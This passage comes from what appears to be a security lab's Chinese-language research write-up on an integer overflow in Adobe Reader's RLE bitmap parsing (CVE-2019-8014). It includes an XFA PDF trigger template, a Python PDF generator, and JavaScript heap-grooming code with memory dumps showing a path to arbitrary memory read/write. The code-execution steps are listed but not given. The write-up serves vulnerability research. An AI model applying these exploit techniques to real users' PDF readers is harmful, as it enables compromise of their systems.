+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+%PDF-1.7
+1 0 obj
+<<
+    /Type /Catalog
+    /AcroForm 5 0 R
+    /Pages 2 0 R
+    /NeedsRendering true
+    /Extensions
+    <<
+        /ADBE
+        <<
+            /ExtensionLevel 3
+            /BaseVersion /1.7
+        >>
+    >>
+>>
+endobj
+2 0 obj
+<<
+    /Type /Pages
+    /Kids [3 0 R]
+    /Count 1
+>>
+endobj
+3 0 obj
+<<
+    /Type /Page
+    /Parent 2 0 R
+    /Contents 4 0 R
+    /Resources
+    <<
+        /Font
+        <<
+            /F1
+            <<
+                /BaseFont /Helvetica
+                /Subtype /Type1
+                /Name /F1
+            >>
+        >>
+    >>
+>>
+endobj
+4 0 obj
+<<
+    /Length 104
+>>
+stream
+BT
+/F1 12 Tf
+90 692 Td
+(If you see this page, it means that your PDF reader does not support XFA.) Tj
+ET
+endstream
+endobj
+5 0 obj
+<<
+    /XFA 6 0 R
+>>
+endobj
+6 0 obj
+<<
+    /Filter /FlateDecode
+    /Length __STREAM_LENGTH__
+>>
+stream
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+  <template xmlns:xfa="http://www.xfa.org/schema/xfa-template/3.1/" xmlns="http://www.xfa.org/schema/xfa-template/3.0/">
+    <subform name="form1" layout="tb" locale="en_US" restoreState="auto">
+      <pageSet>
+        <pageArea name="Page1" id="Page1">
+          <contentArea x="0.25in" y="0.25in" w="576pt" h="756pt"/>
+          <medium stock="default" short="612pt" long="792pt"/>
+        </pageArea>
+      </pageSet>
+      <subform w="576pt" h="756pt">
+        <field name="ImageCrash">
+          <ui>
+            <imageEdit/>
+          </ui>
+          <value>
+            <image aspect="actual" contentType="image/bmp">
+__IMAGE_BASE64_DATA__
+            </image>
+          </value>
+        </field>
+      </subform>
+      <event activity="initialize" name="event__initialize">
+        <script contentType="application/x-javascript">
+// The JavaScript code will be executed before triggering the vulnerability
+        </script>
+      </event>
+      <event activity="docReady" ref="$host" name="event__docReady">
+        <script contentType="application/x-javascript">
+// The JavaScript code will be executed after triggering the vulnerability
+        </script>
+      </event>
+    </subform>
+  </template>
+  <config xmlns="http://www.xfa.org/schema/xci/3.0/">
+    <agent name="designer">
+      <!--  [0..n]  -->
+      <destination>pdf</destination>
+      <pdf>
+        <!--  [0..n]  -->
+        <fontInfo/>
+      </pdf>
+    </agent>
+    <present>
+      <!--  [0..n]  -->
+      <pdf>
+        <!--  [0..n]  -->
+        <version>1.7</version>
+        <adobeExtensionLevel>5</adobeExtensionLevel>
+      </pdf>
+      <common/>
+      <xdp>
+        <packets>*</packets>
+      </xdp>
+    </present>
+  </config>
+  <xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
+    <xfa:data xfa:dataNode="dataGroup"/>
+  </xfa:datasets>
+  <xfdf xmlns="http://ns.adobe.com/xfdf/" xml:space="preserve">
+    <annots/>
+  </xfdf>
+</xdp:xdp>
+endstream
+endobj
+xref
+0 7
+0000000000 65535 f 
+0000000009 00000 n 
+0000000237 00000 n 
+0000000306 00000 n 
+0000000587 00000 n 
+0000000746 00000 n 
+0000000782 00000 n 
+trailer
+<<
+    /Root 1 0 R
+    /Size 7
+>>
+startxref
+__XREF_OFFSET__
+%%EOF
+为了触发整数溢出，前面构造的位图文件的大小将超过 60MB ，而且在嵌入 XFA 表单时，需要对其进行 Base64 编码，这会使得生成的 PDF 文件相当大。为了压缩 PDF 文件的大小，可以给对象 6 0 obj 指定一个 Filter （这里为 FlateDecode ）以便压缩对象的数据，因为数据比较规律，所以压缩率还是相当可观的。
+
+为了实现漏洞利用，需要在触发漏洞前完成内存布局、在触发漏洞后完成后续利用步骤，而这些操作都需要借助执行 JavaScript 代码来完成，因此需要在不同的时间点执行不同的 JavaScript 代码，这可以通过给 subform 的 initialize 事件和 docReady 事件设置事件处理代码来完成。
+
+下面的 Python 代码可以用于生成 PDF 文件：
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+import os
+import sys
+import zlib
+import base64
+
+def parse_template(template_path):
+    with open(template_path, 'rb') as f:
+        data = f.read()
+    xdp_begin = data.find('<xdp:xdp')
+    xdp_end = data.find('</xdp:xdp>') + len('</xdp:xdp>')
+
+    part1 = data[:xdp_begin]
+    part2 = data[xdp_begin:xdp_end]
+    part3 = data[xdp_end:]
+    return part1, part2, part3
+
+def generate_pdf(image_path, template_path, pdf_path):
+    pdf_part1, pdf_part2, pdf_part3 = parse_template(template_path)
+
+    with open(image_path, 'rb') as f:
+        image_data = base64.b64encode(f.read())
+    pdf_part2 = pdf_part2.replace('__IMAGE_BASE64_DATA__', image_data)
+    pdf_part2 = zlib.compress(pdf_part2)
+
+    pdf_part1 = pdf_part1.replace('__STREAM_LENGTH__', '%d' % len(pdf_part2))
+
+    pdf_data = pdf_part1 + pdf_part2 + pdf_part3
+    pdf_data = pdf_data.replace('__XREF_OFFSET__', '%d' % pdf_data.find('xref'))
+
+    with open(pdf_path, 'wb') as f:
+        f.write(pdf_data)
+
+if __name__ == '__main__':
+    if len(sys.argv) != 4:
+        filename = os.path.basename(sys.argv[0])
+        print 'Usage: %s <input.bmp> <template.pdf> <output.pdf>' % filename
+        sys.exit(1)
+    generate_pdf(sys.argv[1], sys.argv[2], sys.argv[3])
+5.5 利用技巧
+5.5.1 内存布局 (1)
+这里借助 ArrayBuffer 来完成内存布局。
+
+因为位图解析过程中创建的堆块大小为 0xF0 字节，因此 ArrayBuffer 的 byteLength 可以设置为 0xE0 。为了创建内存空洞，可以先创建大量的 ArrayBuffer 对象，然后间隔释放其中的一半对象，理想情况下的内存布局如下：
+
+1
+2
+3
+4
+┌─────────────┬─────────────┬─────────────┬─────────────┐
+│ ArrayBuffer │     Hole    │ ArrayBuffer │     Hole    │
+└─────────────┴─────────────┴─────────────┴─────────────┘
+│ <-  0xF0 -> │
+在触发漏洞时，位图解析相关的堆块会落到其中一个空洞上：
+
+1
+2
+3
+┌─────────────┬─────────────┬─────────────┬─────────────┐
+│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │
+└─────────────┴─────────────┴─────────────┴─────────────┘
+因为可以向低地址方向越界写 0xF4 字节的 0x10 数据，所以触发漏洞之后，ArrayBuffer 对象的 backing store 的内存布局如下：
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+0:014> dd 304c8398
+;            -, byteLength, viewobj,       -,
+304c8398  00000000 10101010 10101010 10101010
+;         ArrayBuffer 数据
+304c83a8  10101010 10101010 10101010 10101010
+304c83b8  10101010 10101010 10101010 10101010
+304c83c8  10101010 10101010 10101010 10101010
+304c83d8  10101010 10101010 10101010 10101010
+304c83e8  10101010 10101010 10101010 10101010
+304c83f8  10101010 10101010 10101010 10101010
+304c8408  10101010 10101010 10101010 10101010
+304c8418  10101010 10101010 10101010 10101010
+304c8428  10101010 10101010 10101010 10101010
+304c8438  10101010 10101010 10101010 10101010
+304c8448  10101010 10101010 10101010 10101010
+304c8458  10101010 10101010 10101010 10101010
+304c8468  10101010 10101010 10101010 10101010
+304c8478  10101010 10101010 10101010 10101010 ; ArrayBuffer 结束
+; 下一个堆块的元数据（存储位图数据的堆块）
+304c8488  10101010 10101010
+; 位图数据
+304c8490                    00000000 00000000
+此时 ArrayBuffer 对象的 byteLength 被改成了 0x10101010 ，但是 DataView 对象的指针也被改成了 0x10101010 ，前面提到过这会导致进程崩溃。
+
+5.5.2 内存布局 (0)
+为了避免进程崩溃，需要提前在地址 0x10101010 上布局数据，让这个地址看起来就是一个 DataView 指针。很明显，为了漏洞利用更加稳定，我们需要一开始就在这里布局好数据。
+
+同样，这里借助 ArrayBuffer 实现精确的内存布局：
+
+创建大量 byteLength 为 0xFFE8 的 ArrayBuffer
+在特定内存范围内，ArrayBuffer 的 backing store 将有序的出现在地址 0xYYYY0048 上
+之所以选择 0xFFE8 ，是因为这会使得 backing store 所在堆块整体的大小为 0x10000 ：
+
+1
+2
+3
+4
+// 0xFFE8 -> byteLength
+// 0x10 -> sizeof ObjectElements
+// 0x08 -> sizeof heap block's metadata
+0xFFE8 + 0x10 + 0x08 = 0x10000
+使用下面的代码进行内存布局，可以有效防止进程崩溃（具体细节不作讲解，相关条件很容易通过动态调试分析出来）：
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+function fillHeap() {
+    var array = new Array(0x1200);
+    array[0] = new ArrayBuffer(0xFFE8);
+    var dv = new DataView(array[0]);
+
+    dv.setUint32(0xFB8, 0x10100058, true);
+    dv.setUint32(0, 0x10100158, true);
+    dv.setUint32(0xFFA8, 0x10100258, true);
+    dv.setUint32(0x200 + 0x14, 0x10100358, true);
+
+    for (var i = 1; i < array.length; ++i) {
+        array[i] = array[0].slice();
+    }
+    return array;
+}
+当然，这仅仅只能防止漏洞触发后进程的崩溃，如果要为该 ArrayBuffer 关联新的 DataView 来读写数据，那么会导致新的崩溃。同样，填充一点新的数据就可以防止进程崩溃，新的代码如下所示：
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+function fillHeap() {
+    var array = new Array(0x1200);
+    array[0] = new ArrayBuffer(0xFFE8);
+    var dv = new DataView(array[0]);
+    // 防止触发漏洞之后进程立刻 Crash
+    dv.setUint32(0xFB8, 0x10100058, true);
+    dv.setUint32(0, 0x10100158, true);
+    dv.setUint32(0xFFA8, 0x10100258, true);
+    dv.setUint32(0x200 + 0x14, 0x10100358, true);
+    // 防止关联 DataView 对象时 Crash
+    dv.setUint32(0xFFA4, 0x10100458, true);
+
+    for (var i = 1; i < array.length; ++i) {
+        array[i] = array[0].slice();
+    }
+    return array;
+}
+5.5.3 全局读写
+当 ArrayBuffer 对象的 byteLength 被改成 0x10101010 之后，可以基于这个 ArrayBuffer 对象修改下一个 ArrayBuffer 对象的 byteLength 。在基于 ArrayBuffer 创建内存空洞时，可以在每一个 ArrayBuffer 上存储特定的标记值，这样在内存中搜索 ArrayBuffer 对象就非常简单了。
+
+1
+2
+3
+4
+5
+6
+7
+  (1)byteLength            (3)Global Access
+ ┌─<───<───<───┐            <──────┬──────>
+┌┼────────────┬┼────────────┬──────┼──────┬─────────────┐
+│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │
+└──────┼──────┴─────────────┴┼────────────┴─────────────┘
+       └──>───>───>───>────>─┘
+        (2) byteLength to -1
+当下一个 ArrayBuffer 对象的 byteLength 被改成 0xFFFFFFFF 时，基于这个 ArrayBuffer 对象就可以实现用户态空间的全局读写了。
+
+5.5.4 任意地址读写
+一旦拥有全局读写的能力，我们就可以向低地址方向来搜索特定的关键字来定位 ArrayBuffer 对象在内存中的绝对地址，然后基于这个绝对地址来实现任意地址读写。
+
+这里可以通过搜索 ffeeffee 或者 f0e0d0c0 来定位，为了提高准确性，需要同时校验关键字附近的数据的取值范围。
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+0:014> dd 30080000
+30080000  16b80e9e 0101331b ffeeffee 00000002  ; ffeeffee
+30080010  055a00a4 2f0b0010 055a0000 30080000  ; +0x14 -> 30080000
+30080020  00000fcf 30080040 3104f000 000002e5
+30080030  00000001 00000000 30d69ff0 30d69ff0
+30080040  3eb82e96 08013313 00000000 0000ffe8
+30080050  00000000 00000000 10100158 00000000
+30080060  00000000 00000000 00000000 00000000
+30080070  00000000 00000000 00000000 00000000
+
+0:014> dd 305f4000
+305f4000  00000000 00000000 6ab08d69 0858b71a
+305f4010  0bbab388 30330080 0ff00112 f0e0d0c0  ; f0e0d0c0
+305f4020  15dc2c3f 00000430 305f402c d13bc929  ; +0x0C -> 305f402c
+305f4030  e5c521a7 d9b264d4 919cee58 45da954e
+305f4040  5c3f608b 2b5fd340 0bae3aa9 2b5fd340
+305f4050  0fae32aa d13bc929 e5c521a7 d9b264d4
+305f4060  919cee58 45da954e 9c3f608b f952aa94
+305f4070  989c772a a1dd934a ac5b154b 2fadd038
+5.5.5 剩余步骤
+在拥有任意地址读写能力之后，实现代码执行就是固定的套路了，本文对此不做详细介绍。
+
+剩余的步骤如下：
+
+EIP 劫持
+ASLR 绕过
+DEP 绕过
+CFG 绕过
+0x06. CVE-2013-2729
+前面提到一共找到了三处整数溢出，其中一处位于 RLE8 数据解析过程中，另外两处位于 RLE4 数据解析过程中。难道不应该有四个位置存在整数溢出吗？为什么只找到了三个？
+
+因为有一个在六年前已经修复了（参考 feliam’s write up for CVE-2013-2729）！从版本 2019.012.20035 中的代码也可以看到，确实有一个地方判断了整数溢出的情况，这就是 CVE-2013-2729 引入的补丁。
+
+1
+2
+3
+4
+dst_xpos = BYTE1(cmd) + xpos;
+if ( ypos >= height || dst_xpos < xpos || 
+     dst_xpos < BYTE1(cmd) || dst_xpos > width )  // overflow check
+  goto LABEL_170;         // CxxThrowException
+然而 Adobe 仅仅修补了报告的这一个位置，而忽略了其他三个位置上的整数溢出。
+
+0x07. 经验教训
+对厂商而言，在深入理解漏洞本质的同时，还可以看看是不是有类似的问题需要修复。
+
+对安全研究人员而言，分析完漏洞之后还可以顺便看一下厂商的修复方式，也许不经意间就能发现新的漏洞。
+
+Bitmap CVE-2013-2729 CVE-2019-8014 RLE XFA
+ Apache Dubbo Provider 远程代码执行漏洞 (CVE-2020-1948)Ghidra 从 XXE 到 RCE 
+© 2015 - 2025 Tencent Xuanwu Lab. All Rights Reserved.
